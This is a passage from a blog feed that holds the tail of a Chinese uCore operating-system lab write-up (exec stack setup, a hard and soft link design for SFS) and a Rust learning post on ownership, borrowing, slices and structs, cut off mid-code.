class="hljs-number">0</span>, i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i ++) &#123;<br>        argv_size += strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">uintptr_t</span> stacktop = USTACKTOP - (argv_size/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span>)+<span class="hljs-number">1</span>)*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span>);<br>    <span class="hljs-comment">// 直接将传入的参数压入至新栈的底部</span><br>    <span class="hljs-keyword">char</span>** uargv=(<span class="hljs-keyword">char</span> **)(stacktop  - argc * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span> *));<br><br>    argv_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i ++) &#123;<br>        uargv[i] = <span class="hljs-built_in">strcpy</span>((<span class="hljs-keyword">char</span> *)(stacktop + argv_size ), kargv[i]);<br>        argv_size +=  strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    &#125;<br><br>    stacktop = (<span class="hljs-keyword">uintptr_t</span>)uargv - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br>    *(<span class="hljs-keyword">int</span> *)stacktop = argc;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-built_in">memset</span>(tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<br>    tf-&gt;tf_cs = USER_CS;<br>    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;<br>    tf-&gt;tf_esp = stacktop;<br>    tf-&gt;tf_eip = elf-&gt;e_entry;<br>    tf-&gt;tf_eflags = FL_IF;<br>    ret = <span class="hljs-number">0</span>;<br>out:<br>    <span class="hljs-keyword">return</span> ret;<br>bad_cleanup_mmap:<br>    exit_mmap(mm);<br>bad_elf_cleanup_pgdir:<br>    put_pgdir(mm);<br>bad_pgdir_cleanup_mm:<br>    mm_destroy(mm);<br>bad_mm:<br>    <span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>给出设计实现基于”<strong>UNIX的硬链接和软链接机制</strong>“的概要设计方案</p></blockquote><ul><li><p>SFS中已经预留出硬链接/软链接的相关定义（没有实现）</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * VFS layer high-level operations on pathnames</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *    vfs_link         - Create a hard link to a file.</span><br><span class="hljs-comment"> *    vfs_symlink      - Create a symlink PATH containing contents CONTENTS.</span><br><span class="hljs-comment"> *    vfs_unlink       - Delete a file/directory.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfs_link</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *old_path, <span class="hljs-keyword">char</span> *new_path)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfs_symlink</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *old_path, <span class="hljs-keyword">char</span> *new_path)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfs_unlink</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path)</span></span>;<br></code></pre></div></td></tr></table></figure></li><li><p>硬链接机制的实现</p><ul><li>创建硬链接时，仍然为<code>new_path</code>建立一个<code>sfs_disk_entry</code>结构，但该结构的内部<code>ino</code>成员指向<code>old_path</code>的磁盘索引结点，并使该磁盘索引节点的<code>nlinks</code>引用计数成员加一即可。</li><li>删除硬链接时，令对应磁盘结点<code>sfs_disk_inode</code>中的<code>nlinks</code>减一，同时删除硬链接的<code>sfs_disk_entry</code>结构即可。</li></ul></li><li><p>软链接的实现</p><ul><li>与创建硬链接不同，创建软链接时要多建立一个<code>sfs_disk_inode</code>结构（即建立一个全新的文件）。之后，将<code>old_path</code>写入该文件中，并标注<code>sfs_disk_inode</code>的<code>type</code>为<code>SFS_TYPE_LINK</code>即可。</li><li>删除软链接与删除文件的操作没有区别，直接将对应的<code>sfs_disk_entry</code>和<code>sfs_disk_inode</code>结构删除即可。</li></ul></li></ul><ul><li>moocos的密码是空格<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>即原先查找页目录表的目的是想将某个线性地址转换为物理地址，但如果页目录表中存放的是二级页表的<strong>线性</strong>地址，则需要先查找该二级页表的物理地址，此时需要递归查找，这可能会出现永远也查找不到物理地址的情况。<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Specialty in Rust</title>
    <link href="/2021-09/Learning-Specialty-in-Rust/"/>
    <url>/2021-09/Learning-Specialty-in-Rust/</url>
    
    <content type="html"><![CDATA[<h1 id="commandline"><a href="#commandline" class="headerlink" title="commandline"></a>commandline</h1><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">cargo doc <br>cargo doc --open<br>rustc --explain (something)<br></code></pre></div></td></tr></table></figure><h1 id="common-concepts"><a href="#common-concepts" class="headerlink" title="common concepts"></a>common concepts</h1><h2 id="code-example"><a href="#code-example" class="headerlink" title="code example"></a>code example</h2><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> rand::Rng;<br><span class="hljs-keyword">use</span> std::cmp::Ordering;<br><span class="hljs-keyword">use</span> std::io;<br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Guess the number!&quot;</span>);<br><br>    <span class="hljs-keyword">let</span> secret_number = rand::thread_rng().gen_range(<span class="hljs-number">1</span>..<span class="hljs-number">101</span>);<br><br>    <span class="hljs-keyword">loop</span> &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Please input your guess.&quot;</span>);<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> guess = <span class="hljs-built_in">String</span>::new();<br>        io::stdin()<br>            .read_line(&amp;<span class="hljs-keyword">mut</span> guess)<br>            .expect(<span class="hljs-string">&quot;Failed to read line&quot;</span>);<br>        <span class="hljs-keyword">let</span> guess: <span class="hljs-built_in">u32</span> = <span class="hljs-keyword">match</span> guess.trim().parse() &#123;<br>            <span class="hljs-literal">Ok</span>(num) =&gt; num,<br>            <span class="hljs-literal">Err</span>(_) =&gt; <span class="hljs-keyword">continue</span>,<br>        &#125;;<br><br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);<br><br>        <span class="hljs-keyword">match</span> guess.cmp(&amp;secret_number) &#123;<br>            Ordering::Less =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Too small!&quot;</span>),<br>            Ordering::Greater =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Too big!&quot;</span>),<br>            Ordering::Equal =&gt; &#123;<br>                <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You win!&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>cargo doc --open</code> doc is stored in the folder.</li><li>something special in enumeration waiting for me to be explored </li><li>Rust <strong>doesn’t care where you define your functions, only that they’re defined somewhere.</strong>  </li><li>Statements do not return values. Therefore, you can’t assign a <code>let</code> statement to another variable, and can’t use x=y=6 to have both x and y have the value 6</li><li>Rust will do check of every <strong>array indexing operation</strong>, thus will run slowly</li></ul><h2 id="about-return-statement"><a href="#about-return-statement" class="headerlink" title="about return statement"></a>about return statement</h2><ul><li>Block is expression, expressions do not include ending semicolons. Most functions return the last <strong>expression</strong> implicitly. Assigning a block of statements to a variable will get an empty tuple, expressed by “()”.</li></ul><h2 id="if-expressions"><a href="#if-expressions" class="headerlink" title="if expressions"></a>if <strong><code>expressions</code></strong></h2><ul><li>no parentheses in <code>return</code> and <code>if</code> keyword, Blocks of code associated with the conditions in <code>if</code> expressions are sometimes called <em><strong>arms</strong></em> </li><li>Rust will not automatically try to convert non-Boolean types to a Boolean, do not use integer as the condition of <code>if</code>, instead using an integer greater or less than or equal to an certain number. </li><li>if else if else if …… may be changed to <code>match</code>  </li><li><code>let number = if condition &#123; 5 &#125; else &#123; 6 &#125;;</code> don’t use different types in each arms.</li></ul><h2 id="Repeating"><a href="#Repeating" class="headerlink" title="Repeating"></a>Repeating</h2><ul><li><strong><code>loop</code></strong>(use <code>break</code> and <code>^C</code> to terminate)  , <code>while</code>, and <code>for</code> </li><li><code>break</code> can <strong>take a value</strong> as the return of the <code>loop</code> </li><li>use <code>for element in a.iter()</code> to speed up array indexing </li><li><code>for</code> : <code>for number in (1..4).rev()</code> </li></ul><h1 id="ownership"><a href="#ownership" class="headerlink" title="ownership"></a>ownership</h1><blockquote><p>Ownership is Rust’s most unique feature, and it enables Rust to make memory safety guarantees without needing a garbage collector.    </p><p>Memory Management: Memory is managed through a system of ownership with a set of rules that the compiler checks at <strong>compile time</strong>, won’t slow down your program.</p></blockquote><h2 id="ownership-rules"><a href="#ownership-rules" class="headerlink" title="ownership rules:"></a>ownership rules:</h2><blockquote><ol><li>Each value in Rust has a variable that’s called its <em>owner</em>.</li><li>There can only be one owner at a time.</li><li>When the owner goes out of scope, the value will be dropped.</li></ol></blockquote><ul><li><p><strong>immutable</strong> string literals and the <strong>changeable</strong> String type </p></li><li><p>create a <code>String</code> from a string literal using the <code>from</code> function: <code>let s = String::from(&quot;hello&quot;);</code> </p></li><li><p>Rust takes a different path from those languages having GC: the memory is <u>automatically returned</u> once the variable that owns it goes out of scope.</p></li><li><p>Rust calls a special function for us. This function is called <a href="https://doc.rust-lang.org/std/ops/trait.Drop.html#tymethod.drop"><code>drop</code></a>, and it’s where the author of <code>String</code> can put the code to return the memory. Rust calls <code>drop</code> automatically at the closing curly bracket.</p></li><li><p>the following code will lead to a move instead of a shallow or deep copy, or you can use <code>s1.clone()</code> to do deep copy</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);<br><span class="hljs-keyword">let</span> s2 = s1;<br></code></pre></div></td></tr></table></figure></li><li><p>there is <code>copy</code> and <code>drop</code> trait, which won’t coexist, the former will leave old value as valid.</p></li><li><p><strong>Ownership and Functions</strong> </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);  <span class="hljs-comment">// s comes into scope</span><br><br>    takes_ownership(s);             <span class="hljs-comment">// s&#x27;s value moves into the function...</span><br>                                    <span class="hljs-comment">// ... and so is no longer valid here</span><br><br>    <span class="hljs-keyword">let</span> x = <span class="hljs-number">5</span>;                      <span class="hljs-comment">// x comes into scope</span><br><br>    makes_copy(x);                  <span class="hljs-comment">// x would move into the function,</span><br>                                    <span class="hljs-comment">// but i32 is Copy, so it&#x27;s okay to still</span><br>                                    <span class="hljs-comment">// use x afterward</span><br><br>&#125; <span class="hljs-comment">// Here, x goes out of scope, then s. But because s&#x27;s value was moved, nothing</span><br>  <span class="hljs-comment">// special happens.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">takes_ownership</span></span>(some_string: <span class="hljs-built_in">String</span>) &#123; <span class="hljs-comment">// some_string comes into scope</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, some_string);<br>&#125; <span class="hljs-comment">// Here, some_string goes out of scope and `drop` is called. The backing</span><br>  <span class="hljs-comment">// memory is freed.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">makes_copy</span></span>(some_integer: <span class="hljs-built_in">i32</span>) &#123; <span class="hljs-comment">// some_integer comes into scope</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, some_integer);<br>&#125; <span class="hljs-comment">// Here, some_integer goes out of scope. Nothing special happens.</span><br></code></pre></div></td></tr></table></figure></li><li><p><strong>Return Values and Scope</strong> </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s1 = gives_ownership();         <span class="hljs-comment">// gives_ownership moves its return</span><br>                                        <span class="hljs-comment">// value into s1</span><br><br>    <span class="hljs-keyword">let</span> s2 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>);     <span class="hljs-comment">// s2 comes into scope</span><br><br>    <span class="hljs-keyword">let</span> s3 = takes_and_gives_back(s2);  <span class="hljs-comment">// s2 is moved into</span><br>                                        <span class="hljs-comment">// takes_and_gives_back, which also</span><br>                                        <span class="hljs-comment">// moves its return value into s3</span><br>&#125; <span class="hljs-comment">// Here, s3 goes out of scope and is dropped. s2 goes out of scope but was</span><br>  <span class="hljs-comment">// moved, so nothing happens. s1 goes out of scope and is dropped.</span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">gives_ownership</span></span>() -&gt; <span class="hljs-built_in">String</span> &#123;             <span class="hljs-comment">// gives_ownership will move its</span><br>                                             <span class="hljs-comment">// return value into the function</span><br>                                             <span class="hljs-comment">// that calls it</span><br><br>    <span class="hljs-keyword">let</span> some_string = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello&quot;</span>); <span class="hljs-comment">// some_string comes into scope</span><br><br>    some_string                              <span class="hljs-comment">// some_string is returned and</span><br>                                             <span class="hljs-comment">// moves out to the calling</span><br>                                             <span class="hljs-comment">// function</span><br>&#125;<br><br><span class="hljs-comment">// takes_and_gives_back will take a String and return one</span><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">takes_and_gives_back</span></span>(a_string: <span class="hljs-built_in">String</span>) -&gt; <span class="hljs-built_in">String</span> &#123; <span class="hljs-comment">// a_string comes into</span><br>                                                      <span class="hljs-comment">// scope</span><br><br>    a_string  <span class="hljs-comment">// a_string is returned and moves out to the calling function</span><br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h2 id="References-and-Borrowing"><a href="#References-and-Borrowing" class="headerlink" title="References and Borrowing"></a>References and Borrowing</h2><ul><li>we call having references as function parameters <em>borrowing</em> </li><li>Reference’s <strong>default  immutable</strong>  </li><li><strong>Use mutabel parameter:</strong> <ol><li>First, we had to change <strong>variable</strong> <code>s</code> to be <code>mut</code>. </li><li>Then we had to create a mutable reference with <code>&amp;mut s</code> </li><li>and accept a mutable reference in the function with <code>some_string: &amp;mut String</code>.</li></ol></li><li><strong>you can have only one mutable reference to a particular piece of data in a particular scope(avoiding <em>race</em>)</strong></li></ul><blockquote><p>A <em><strong>data race</strong></em> is similar to a race condition and happens when these three behaviors occur:</p><ul><li>Two or more pointers access the same data at the same time.</li><li>At least one of the pointers is being used to write to the data.</li><li>There’s no mechanism being used to synchronize access to the data.</li></ul><p>The Rust prevents it by giving out an error.</p></blockquote><ul><li>E0502: A variable already borrowed as immutable was borrowed as mutable. </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">bar</span></span>(x: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>(a: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;<br>    <span class="hljs-keyword">let</span> y = &amp;a; <span class="hljs-comment">// a is borrowed as immutable.</span><br>    bar(a);     <span class="hljs-comment">// as immutable</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>To fix this error, ensure that you don’t have any other references to the variable before trying to access it mutably:   </p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">bar</span></span>(x: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>(a: &amp;<span class="hljs-keyword">mut</span> <span class="hljs-built_in">i32</span>) &#123;<br>    bar(a);<br>    <span class="hljs-keyword">let</span> y = &amp;a; <span class="hljs-comment">// ok!</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y); <br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="The-slice-type"><a href="#The-slice-type" class="headerlink" title="The slice type"></a>The slice type</h2><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">String</span>) -&gt; <span class="hljs-built_in">usize</span> &#123;<br>    <span class="hljs-keyword">let</span> bytes = s.as_bytes();<br><br>    <span class="hljs-keyword">for</span> (i, &amp;item) <span class="hljs-keyword">in</span> bytes.iter().enumerate() &#123; <br><span class="hljs-comment">//iter is a method that returns each element in a collection and that enumerate wraps the result of iter </span><br>    <span class="hljs-comment">//and returns each element as part of a tuple instead.(first index, second the reference)</span><br>        <span class="hljs-keyword">if</span> item == <span class="hljs-string">b&#x27; &#x27;</span> &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    s.len()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    <span class="hljs-keyword">let</span> word = first_word(&amp;s); <span class="hljs-comment">// word will get the value 5</span><br>    s.clear(); <span class="hljs-comment">// this empties the String, making it equal to &quot;&quot;</span><br>    <span class="hljs-comment">// word still has the value 5 here, but there&#x27;s no more string that</span><br>    <span class="hljs-comment">// we could meaningfully use the value 5 with. word is now totally invalid!</span><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>return a <em>string slice</em> instead of an index </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">String</span>) -&gt; &amp;<span class="hljs-built_in">str</span> &#123;<span class="hljs-comment">//The type that signifies “string slice” is written as &amp;str</span><br>    <span class="hljs-keyword">let</span> bytes = s.as_bytes();<br>    <span class="hljs-keyword">for</span> (i, &amp;item) <span class="hljs-keyword">in</span> bytes.iter().enumerate() &#123;<br>        <span class="hljs-keyword">if</span> item == <span class="hljs-string">b&#x27; &#x27;</span> &#123;<br>            <span class="hljs-keyword">return</span> &amp;s[<span class="hljs-number">0</span>..i];<br>        &#125;<br>    &#125;<br>    &amp;s[..] <span class="hljs-comment">//equals &amp;s[0..len]</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">str</span>) -&gt; &amp;<span class="hljs-built_in">str</span> &#123;&#125;<span class="hljs-comment">//use the same function on both &amp;String values and &amp;str values.</span><br></code></pre></div></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> my_string = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello world&quot;</span>);<br><br>    <span class="hljs-comment">// first_word works on slices of `String`s</span><br>    <span class="hljs-keyword">let</span> word = first_word(&amp;my_string[..]);<br><br>    <span class="hljs-keyword">let</span> my_string_literal = <span class="hljs-string">&quot;hello world&quot;</span>;<br><br>    <span class="hljs-comment">// first_word works on slices of string literals</span><br>    <span class="hljs-keyword">let</span> word = first_word(&amp;my_string_literal[..]);<br><br>    <span class="hljs-comment">// Because string literals *are* string slices already,</span><br>    <span class="hljs-comment">// this works too, without the slice syntax!</span><br>    <span class="hljs-keyword">let</span> word = first_word(my_string_literal);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="stuct"><a href="#stuct" class="headerlink" title="stuct"></a>stuct</h1><ul><li>Rust doesn’t allow us to mark only certain fields as mutable. As with any expression, we can construct a new instance of the struct as the last expression in the function body to implicitly return that new instance.</li><li>Unit-like structs can be useful in situations in which you need to implement a trait on some type but don’t have any data that you want to store in the type itself</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Debug)]</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Person</span></span> &#123;<br>    name: <span class="hljs-built_in">String</span>,<br>    age: <span class="hljs-built_in">u8</span>,<br>&#125;<br><br><span class="hljs-comment">// A unit struct</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Unit</span></span>;<br><br><span class="hljs-comment">// A tuple struct</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Pair</span></span>(<span class="hljs-built_in">i32</span>, <span class="hljs-built_in">f32</span>);<br><br><span class="hljs-comment">// A struct with two fields</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Point</span></span> &#123;<br>    x: <span class="hljs-built_in">f32</span>,<br>    y: <span class="hljs-built_in">f32</span>,<br>&#125;<br><br><span class="hljs-comment">// Structs can be reused as fields of another struct</span><br><span class="hljs-meta">#[allow(dead_code)]</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Rectangle</span></span> &#123;<br>    <span class="hljs-comment">// A rectangle can be specified by where the top left and bottom right</span><br>    <span class="hljs-comment">// corners are in space.</span><br>    top_left: Point,<br>    bottom_right: Point,<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-comment">// Create struct with field init shorthand</span><br>    <span class="hljs-keyword">let</span> name = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;Peter&quot;</span>);<br>    <span 